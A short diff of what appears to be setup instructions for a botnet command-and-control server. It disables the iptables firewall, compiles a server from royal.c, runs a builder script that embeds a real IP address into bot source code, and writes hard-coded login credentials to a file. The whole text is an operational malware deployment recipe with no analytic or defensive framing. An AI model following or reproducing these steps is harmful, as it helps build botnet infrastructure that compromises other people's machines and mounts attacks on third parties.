@@ -9,7 +9,7 @@ service iptables stop
 --------------------------------------------------------------------
 gcc royal.c -o server -pthread
 --------------------------------------------------------------------
-python RAZA.py bot_RROYAL4HS.c 51.89.62.246  (Server IP)
+python royal.py bot_ROYAL4HS.c 51.89.62.246  (Server IP)
 --------------------------------------------------------------------
 echo raza raza >>Login.txt
 ------------------------------
